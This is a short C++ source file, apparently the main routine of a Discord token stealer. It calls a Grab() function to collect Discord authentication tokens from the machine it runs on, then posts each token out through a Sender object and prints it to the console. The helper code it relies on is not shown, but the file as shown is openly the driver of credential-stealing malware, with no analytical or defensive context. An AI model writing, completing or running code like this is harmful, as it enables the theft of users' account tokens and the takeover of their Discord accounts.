#include "discord.hpp"
#include <iostream>
#include "sender.h"
int main( ) {
	Sender Send;
	Discord Discord;
	clock_t begin = clock();
	std::vector<std::string> Tokens = Discord.Grab();
	switch (Discord.IsFoundToken) {
	case true:
		
		for (int index = 0; index < Tokens.size(); index++) {
			Send.Post(Tokens[index]);
			std::cout << "Tokens -> " << Tokens[index] << std::endl;
	
				
		}

		break;
	case false:
		std::cout << "Couldn't Find any tokens" << std::endl;
		break;
	default :
		std::cout << "Couldn't Find any tokens" << std::endl;
		break;
	}
	
	clock_t end = clock();
	double elapsed_secs = double(end - begin) / CLOCKS_PER_SEC;
	std::cout << "Time Elapsed -> " << elapsed_secs << std::endl;
}
